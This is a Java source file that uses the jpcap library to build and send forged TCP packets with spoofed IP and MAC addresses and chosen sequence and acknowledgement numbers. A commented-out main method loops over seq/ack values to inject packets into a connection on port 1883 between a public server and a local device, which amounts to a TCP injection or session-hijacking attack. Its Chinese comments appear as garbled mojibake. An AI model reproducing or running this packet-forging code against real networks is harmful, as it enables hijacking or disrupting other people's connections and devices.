package Util.SetPacket;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import com.sun.org.apache.regexp.internal.recompile;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.TCPPacket;
import Model.Model_a;




public class SetTCP {
	
	/*static Manager_airdump ma = new Manager_airdump();
	static CapPacket cp = new CapPacket();*/
	/**
	 * @param args
	 */
	/*public static void main(String[] args)  {
		// TODO Auto-generated method stub
		//Manager_airdump ma = new Manager_airdump();
		*//*************************************************
		 * ��������MAC"60:D8:19:4a:b2:fc"
		 * ����MAC"AC:CF:23:87:BD:2E"
		 *************************************************//*
		
		//run()��õ��������������ݣ�ѡ��Ҫ���͵�����
		//Model_a model= ma.run("1122.pcap","192.168.8.100","112233.pcap","192.168.8.101").get(0);
		SentTCP st = new SentTCP();
		//ѡ������
		JpcapSender js = getCrad(3);
		
		//cp.capPacket_run(0);
		
		
		List<TCPPacket> tcps = new ArrayList<TCPPacket>();
		
		long ack = 53464;
		long seq = 4645677;
		
		//α�����ݰ�,i��ʾseq���ӵķ�Χ,j��ʾACK���ӵķ�Χ  
		for(int i = 0;i<5; i++ ){
			for(int j = 0;j<5;j++){
				
				TCPPacket tcp = st.fakePacket(1883,49157,seq, ack, "119.29.42.117", "192.168.8.101", 
						"60:d8:19:4a:b2:fc", "AC:CF:23:87:BD:2E", null);
				//ÿ��α��һ�����ݰ�֮��identification��Ҫ��1,seq +2 
					tcps.add(tcp);
			}
		}
		
		
		//�������ݰ�
		sendPacket(js, tcps);
	}*/
	
	
	
	/*************************************************
	 * ��������
	 *************************************************/
	
	  public static byte [] getMacBytes(String mac){
		  byte []macBytes = new byte[6];
		  String [] strArr = mac.split(":");
		  
		  for(int i = 0;i < strArr.length; i++){
		   int value = Integer.parseInt(strArr[i],16);
		   macBytes[i] = (byte) value;
		  }
		  return macBytes;
	 }
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  /*************************************************
	 * �������ݰ�����
	 *************************************************/
	  
	  public  TCPPacket fakePacket(Integer port_sou,Integer port_des,long seq,long ack,String ip_sou, String ip_des,String mac_src,
			  String mac_des,Model_a model_a){
		  
		  
		  TCPPacket tcp = null;
		  boolean ackfalg = true;
		  boolean pushfalg = true;
		  
		  if(model_a == null){
				ackfalg = true;
				pushfalg = false;
				tcp = new TCPPacket(port_sou, port_des, seq , ack, false, ackfalg, pushfalg, false, false, 
						false, false, false, 20904, 0);
				tcp.data ="".getBytes();
				
			}
			else {
				
				tcp = new TCPPacket(port_sou, port_des, seq , ack, false, ackfalg, pushfalg, false, false, 
						false, false, false, 20904, 0);
				
				if(model_a.getData_byte().length ==0){
					
					tcp.data ="".getBytes();
					tcp.psh = false;
					
				}else {
					tcp.data = model_a.getData_byte();
				}
				
				
				
			}
		  
			 
			
			InetAddress sip = null;
			InetAddress dip = null;
			try {
				sip = InetAddress.getByName(ip_sou);   //ģ���ֻ�APP�˵�IP��ַ
				dip = InetAddress.getByName(ip_des);	//������·�����µ�IP��ַ
	//System.out.println("IP��ַ souip:"+sip+"  desip"+dip);
	//System.out.println(" ");
			} catch (UnknownHostException e1) {
	System.out.println("IP��ַ��ʼ��ʧ��");
				e1.printStackTrace();
			}
			
			if(sip != null&&dip != null){
				//ip��ַ���Ը��ݶ�̬ץ���õ���IP��ַ����
				//306066��һ����ֵ֤��������ô��������δ�о�
				//52���������ڣ�ͬ������ͨ��ץȡ�İ����ж�,6��ָ�ϲ�ʹ��TCP
				//�����IP
				tcp.setIPv4Parameter(0, false, false, false, 0, false, true, false, 0, 4645654, 52, 6,sip, dip);
				
				
			}
			
			//��·��
			EthernetPacket ether = new EthernetPacket();		
			ether.frametype = EthernetPacket.ETHERTYPE_IP;
			
			ether.src_mac = getMacBytes(mac_src);  //�Լ����Ե�����
			ether.dst_mac = getMacBytes(mac_des);  //����������,����·������?
			
			tcp.datalink = ether;
			
		return tcp;    
	  }
	  
	  
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  /*************************************************
	 * �ú������ڷ������ݰ�
	 *************************************************/
	  public static void sendPacket(JpcapSender js,List<TCPPacket> tcps){
		  Robot r = null;
		  try {
			r = new Robot();
		} catch (AWTException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		  
		  if(js != null){
				try{
					for(int i = 0 ;i<tcps.size();i++){
						js.sendPacket(tcps.get(i));
						
							//�ӳٷ���ms
							r.delay(1500);
							
							
System.out.println("������һ������"+i);
System.out.println(tcps.get(i).toString());	
System.out.println("");
										
					}


				}catch(Exception e){
					e.printStackTrace();
				}finally{	
					js.close();
				}	
			}
		  
		  
		  
	  }
	  
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  /*************************************************
	 * ��ȡ�����������ݵ�����
	 *************************************************/
	  public static JpcapSender getCrad(int deviceNum){
		  
			NetworkInterface[] devices = null;
			
			 try{    
				 //��ȡ�����ϵ�����ӿڶ�������    
				  devices = JpcapCaptor.getDeviceList();
System.out.println("������ȡ�ɹ�  ");  
				 }catch(Exception ef){    
				            ef.printStackTrace();    
	System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
				    }  
			 
			JpcapSender js = null;
			
			try {
				js = JpcapSender.openDevice(devices[deviceNum]);
System.out.println("�ѻ�ȡ����(����ʹ��)  "+deviceNum+"  JSender�����ɹ�");  				
			} catch (IOException e1) {
	System.out.println("JSender�������ɹ�");
				e1.printStackTrace();
			}
			  
		  return js;
	  } 
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
}
